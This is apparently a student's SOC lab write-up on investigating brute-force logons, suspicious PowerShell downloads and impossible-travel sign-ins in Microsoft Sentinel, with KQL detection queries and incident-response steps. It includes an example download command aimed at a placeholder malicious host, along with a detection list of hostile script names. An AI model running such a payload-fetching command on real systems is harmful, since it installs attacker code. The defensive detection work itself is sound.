<h1>Incident Response in Sentinel - NIST 800-61</h1>

<h2>Objective</h2>
To develop an understanding of Microsoft Sentinel and how to effectively navigate the platform, using KQL queries to investigate suspicious behaviour related to brute-force attacks, malicious PowerShell activity, impossible travel events, and excessive Azure resource creation or deletion. The aim of this lab was to understand where logs originate from, identify key indicators of suspicious activity, and gain practical experience with the investigation and alert triage process within a SOC environment.


<h2>Environment</h2>
<ul>
  <li>Microsoft Azure, Sentinel & Defender</li>
</ul>

<h2>Tasks Completed</h2>
<ul>
  <li>Brute Force: Created an alert in Sentinel using the KQL query to search for a failed login attemps that were greater than or equal to 10 attempts, triggering and incident in the SIEM. We later than analysed the attack and carried out the IR lifecycle in line with NIST.</li>
  <li> PowerShell Suspicious Web Request: Created an alert in Sentinel using a KQL query to search for a malicious command, Invoke-WebRequest to identify the logs and affected host, as well as searching to see if the command was executed. I then followed the IR lifecycle in line with NIST</li>
</ul>

<h2>Screenshots</h2>

<h2>Virtual Machine Brute Force Detection</h2>

<h3>Creating a KQL Query</h3>

`DeviceLogonEvents
| where TimeGenerated >= ago(5h)
| where ActionType == "LogonFailed"
| summarize NumberOfFailures = count() by RemoteIP, ActionType, DeviceName 
| where  NumberOfFailures >= 10`

<h3>Creating an Alert Rule</h3>

<b>Process:</b> `Microsoft Sentinel - Configuration - Analytics - Create (Scheduled Query Rule) -  Enable the Rule -  set Mitre ATT&CK Framework Categories based on the query - Run query every 4 hours - Lookup data for last 5 hours (can define in query) - Stop running query after alert is generated == Yes - Configure Entity Mappings for the Remote IP and DeviceName -Automatically create an Incident if the rule is triggered - Group all alerts into a single Incident per 24 hours - Stop running query after alert is generated (24 hours) - Review & Create`

<p>
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/b12acecd47cb5a35458f083a95eb1f7ad48321e2/Screenshot%202026-05-18%20at%2009.44.36.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/166041a45f01d65f1aa4b803178fdd91e111421d/Screenshot%202026-05-18%20at%2010.20.54.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/97345e06b44a6cab52570c6b53797a523a1ba28b/Screenshot%202026-05-18%20at%2010.44.47.png" width="300" height="300" /> 
</p>

<b>Screenshot1:</b> Shows the creation of the alert using a specific KQL query for brute-force and entity mapping to generate the results.<br>

<b>Screenshot2:</b> Shows the alert has been triggered as an incident in Sentinel, assigning the task to myself and setting the status to active to work on the incident.<br>

<b>Screenshot3:</b> Shows the investigation map identifying the public IP addresses involved in the brute-force attack, along with the targeted hosts/devices. To generate the investigation graph, I assigned the incident to myself and changed the status to Active within Microsoft Sentinel. It is important during the investigation process to document the malicious IP addresses and affected hosts for further analysis, containment, and escalation activities.

<h3>Microsoft Defender for Endpoint</h3>

In a real-world scenario, if the login attempt was successful, I would immediately isolate the affected host or device to help prevent lateral movement and stop any malware or ransomware that may have already been executed from spreading further across the environment. I would also initiate an anti-virus or endpoint scan as part of the containment process.

Using Microsoft Defender for Endpoint, I would navigate to the affected device under the Assets/Devices section and apply device isolation and containment actions before escalating the incident to a senior SOC analyst for further investigation and remediation activities.

To determine whether the brute-force attempt was successful, I used the KQL query below. If no successful logon events are returned, this indicates the brute-force attempt was unsuccessful.

In some cases, it may also be necessary to create a Network Security Group (NSG) rule within Microsoft Azure in response to the brute-force activity. Attackers commonly scan for exposed RDP services on port 3389 or SSH services on port 22 in order to carry out repeated authentication attempts against publicly accessible systems.

<b>Process:</b> `Azure - Network Security Group - Create Port Rule.`

For the final step of the Incident Response you want to declare your findings, you do this by - <b>Process:</b> `Sentinel - Incidents - Search for Incident - Select Incident - View Full Details - Select Activity Log - Post Comment`

<h3>Investigate Brute-Force Attack & KQL Queries</h3>

<b>Build sequence of events to dertermine True Positive or False Positive:</b> Failed logins, Successful login, PowerShell execution, External connection, File download

<B>Number of failed logins:</B> Was this a single failed login? or hundreds/thousands?

`DeviceLogonEvents
| where ActionType == "LogonFailed"
| summarize FailedAttempts = count() by RemoteIP, AccountName
| order by FailedAttempts desc`

<B>Login Successful:</B> LogonSuccess

`DeviceLogonEvents
| where RemoteIP in ("185.156.73.169")
| where ActionType != "LogonFailed"`

<B>RDP logons:</B> Brute-force attacks commonly target: RDP (3389) SSH (22)

`DeviceLogonEvents
| where LogonType == "RemoteInteractive"`

(whether remote access was attempted or achieved)

<B>Geolocation anomalies</B>

Check: country, ASN, VPN/proxy indicators<br>
Questions: Is the login from a suspicious country? Is it unusual for the organisation? Is it impossible travel?

<B>Multiple usernames targeted:</B> Many usernames, same source IP

`DeviceLogonEvents
| summarize Attempts=count() by RemoteIP, AccountName`

<B>PowerShell Executed</B>

If successful login occurred: attackers often execute PowerShell immediately<br>
Check:DeviceProcessEvents, suspicious scripts, encoded commands, Invoke-WebRequest

<B>Check for lateral movement:</B> Did the compromised host connect to other systems? Were admin shares accessed? Were new logons created?

Check: DeviceNetworkEvents, additional hosts, SMB/RDP traffic

<B>Investigate persistence</B>

Attackers may: create accounts, install services, schedule tasks<br>
Look for: new users, scheduled tasks, registry changes<br>



<h2>PowerShell Suspicious Web Request</h2>

<h3>Creating a KQL Query</h3>

`let TargetHostname = "nicks-vm";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated`

<h3>Creating an Alert Rule</h3>

<b>Process:</b> `Microsoft Sentinel - Configuration - Analytics - Create (Scheduled Query Rule) - Fill in: Name: - Description: - Enable the Rule - Use ChatGPT to set Mitre ATT&CK Framework Categories based on the query - Run query every 4 hours - Lookup data for last 24 hours (can define in query) - Stop running query after alert is generated == Yes- Configure Entity Mappings:	Account: Identifier: Name, Value: AccountName, Host: Identifier: HostName, Value: DeviceName, Process: Identifier: CommandLine, Value: ProcessCommandLine - Automatically create an Incident if the rule is triggered - Group all alerts into a single Incident per 24 hours - Stop running query after alert is generated (24 hours)`


<p>
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/086e14fe01c709b7d4c2f85a56458f33ee0fc243/Screenshot%202026-05-23%20at%2012.01.27.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/10959ae6b1ef6bdb77155da0647754de9ad061dd/Screenshot%202026-05-23%20at%2012.11.16.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/d4e13bb19febde831fb697856c9e2dd5aa29bb78/Screenshot%202026-05-23%20at%2013.24.14.png" width="300" height="300" /> 
</p>

<b>Screenshot1:</b> Shows me creating a KQL query to detect suspicious PowerShell activity involving Invoke-WebRequest, a command commonly abused by attackers to download malicious payloads or external scripts.<br>
<b>Screenshot2:</b> Shows me creating a detection rule using KQL queries and entity mapping within Microsoft Sentinel to generate the relevant data and investigation results required for security analysis.<br>
<b>Screenshot3:</b> Shows me gathering relevant investigation data and compiling my findings within the activity log for escalation to senior SOC analysts. <b>Process:</b> `Sentinel - Threat Management - Incidents - Target Host - Assign Owner (Me) - Change Status: Active - View Full Details - Investigate - Copy & Paste Commands found into notes (See below)`

<h3>Detection & Analysis -</h3> <b>Prepare findings in this format for submission</b><br>
Upon investigating the triggered incident, document the affected host/device name, number of related events, and any suspicious activity identified during analysis.

<b>Scripts</b> <br>
Copy and paste the relevant PowerShell scripts, commands, or payloads associated with the alert into the investigation notes for documentation and escalation purposes.

<b>Commands</b><br>
If a suspicious script or command is identified (for example portscan.ps1), review the script contents and retrieve the raw command or payload for further analysis. Document any indicators of compromise (IOCs), suspicious URLs, encoded commands, or malicious behaviour observed.

<b>Execution Validation</b> 
Use the KQL query below to determine whether the PowerShell command or script was successfully executed on the endpoint. If results are returned, this confirms execution activity and should be documented within the investigation notes before escalation to the SOC2 analyst/team.

Include:
<ul>
  <li>affected host/device</li>
  <li>user account</li>
  <li>timestamps</li>
  <li>related KQL queries used during investigation
any identified indicators of compromise (IOCs)</li>
</ul>


<h3>Containment, Eradication, and Recovery:</h3> 

<b>Isolate</b><br>

Document that the affected machine was isolated within Microsoft Defender for Endpoint and that an anti-virus/malware scan was initiated as part of the containment process.

`MDE → Assets → Devices → Search for Device → Device Actions → Isolate Device & Run Antivirus Scan`

This helps: prevent lateral movement, contain potential malware/ransomware, limit further attacker activity within the environment

<b>Close Out Incident</b> 

Once the investigation has been completed, review and condense the investigation notes into a clear incident summary before updating the Sentinel activity log and closing the incident.

`Sentinel - Threat Management - Incidents - Search for Incident - View Full Details → Activity Log - Post Investigation Notes - Change Status: Closed`

<h3>KQL Query – Detect Downloaded PowerShell Scripts</h3>

`let TargetHostname = "windows-target-1"; 
let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName =~ "powershell.exe"
| where ProcessCommandLine contains "-File"
| where ProcessCommandLine has_any (ScriptNames)
| order by Timestamp desc
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine`

<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/2bfbf15eff46759ff9d5b0547001f546ebba15cf/Screenshot%202026-05-23%20at%2014.11.51.png" width="300" height="300" /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

<h3>Malicious PowerShell Commands Used by Attackers & KQL Detection Queries</h3>

<b>Invoke-WebRequest:</b> downloading malware, pulling payloads, retrieving scripts from external servers

PowerShell Command
`Invoke-WebRequest http://malicious-site/payload.exe`


<h2>Potential Impossible Travel</h2>

<h3>Creating a KQL Query</h3>

`let TimePeriodThreshold = timespan(7d); 
let NumberOfDifferentLocationsAllowed = 2;
SigninLogs
| where TimeGenerated > ago(TimePeriodThreshold)
| summarize Count = count() by UserPrincipalName, UserId, City = tostring(parse_json(LocationDetails).city), State = tostring(parse_json(LocationDetails).state), Country = tostring(parse_json(LocationDetails).countryOrRegion)
| project UserPrincipalName, UserId, City, State, Country
| summarize PotentialImpossibleTravelInstances = count() by UserPrincipalName, UserId
| where PotentialImpossibleTravelInstances > NumberOfDifferentLocationsAllowed`

<h3>Creating an Alert</h3>

<b>Process:</b> `Microsoft Sentinel - Configuration - Analytics - Create (Scheduled Query Rule) - Fill in: Name: - Description: - Enable the Rule -  set Mitre ATT&CK Framework Categories based on the query - Run query every 4 hours - Lookup data for last 7 days (can define in query) - Stop running query after alert is generated == Yes- Configure Entity Mappings:	Account: Identifier: AadUserId, Value: UserId, Identifier: DisplayName, Value: UserPrincipalName - Automatically create an Incident if the rule is triggered - Group all alerts into a single Incident per 24 hours - Stop running query after alert is generated (24 hours)`

<p>
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/22ad8328ba34a036a885a92a147e3da329b42fd7/Screenshot%202026-05-24%20at%2011.05.00.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/f4fd0b2fb55173a897c36015c6ec65974803f215/Screenshot%202026-05-24%20at%2011.21.43.png" width="300" height="300"/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src= "https://github.com/NickHoward1/Incident-Response-in-Sentinel-NIST-800-61-/blob/02d97b3698bc0cfe23f3506ff368aefdee7eba7e/Screenshot%202026-05-24%20at%2016.13.44.png" width="300" height="300" /> 
</p>

<b>Screenshot1:</b> Shows .<br>
<b>Screenshot2:</b> Shows .<br>
<b>Screenshot3:</b> Shows  .<br>

<h3>Detection & Analysis Section</h3>

<b>Prepare:</b> Document roles, responsibilities, and procedures. Ensure tools, systems, and training are in place.

Investigate each individual account using a KQL query to see exactly where they have been logging into and make your own judgement if they are false or true positives. For example, if the user logged into two neighboring cities within a reasonable amount of time, this would be a false positive. However if someone has logged into Thailand, then Seattle, then Thailand all within 12 hours, this would be suspect.

// Investigate Potential Impossible Travel Instances
`let TargetUserPrincipalName = "Nickhoward605@gmail.com"; // Change to your target user (UserPrincipalName)
let TimePeriodThreshold = timespan(7d); // Change to how far back you want to look
SigninLogs
| where TimeGenerated > ago(TimePeriodThreshold)
| where UserPrincipalName == TargetUserPrincipalName
| project TimeGenerated, UserPrincipalName, City = tostring(parse_json(LocationDetails).city), State = tostring(parse_json(LocationDetails).state), Country = tostring(parse_json(LocationDetails).countryOrRegion)
| order by TimeGenerated desc`

Observe the different Users (UserPrincipalNames) logon patterns and take notes.<br>
Example: Nickhoward605@ logged in from x and y within Z time period: suspect<br>
Example: arisa_lognpacific@lognpacific.com logged in from a and b within C time period: normal<br>

<h3>Containment, Eradication, and Recovery</h3>

<b>Isolate affected systems to prevent further damage.</b>

Depending on corporate policy and evidence, you might immediately disable the account in Entra ID (Azure Active Directory) and contact the user or the user’s manager to investigate.

<ul>
  <li>Example: It was determined that the alert was a TRUE POSITIVE. User ___ and logged into __ and __ within an __ day time period, which should not be possible.</li>
  <li>The user's account was disabled and management contacted.</li>
</ul>

<b>Remove the threat and restore systems to normal.</b>

<ul>
  <li>If the logon behavior was unusual, account compromise may be possible..</li>
  <li>Pivot to see what other activity the user has been doing. For example, you can look in the AzureActivity log:.</li>
</ul>

`AzureActivity
| where tostring(parse_json(Claims)["http://schemas.microsoft.com/identity/claims/objectidentifier"]) == "<azure user id/guid>"`

<h3>Post-Incident Activities</h3>

<ul>
  <li>Update policies and tools to prevent recurrence:geo-fencing policy within azure that prevents logins outside of certain regions. You can’t do this in our environment, but it’s something to keep in mind.</li>
  <li>Document findings and lessons learned:Record your notes within the incident. </li>
</ul>

<h3>Closure</h3>

<ul>
  <li>Review and confirm incident resolution: Review/observe your notes for the incident. </li>
  <li>Finalize reporting and close the case: Close out the Incident within Sentinel as a “Benign Positive” (or whatever it was in your case) </li>
</ul>



<h2>Excessive Resource Creation / Deletion</h2>

<h2>Outcome</h2>
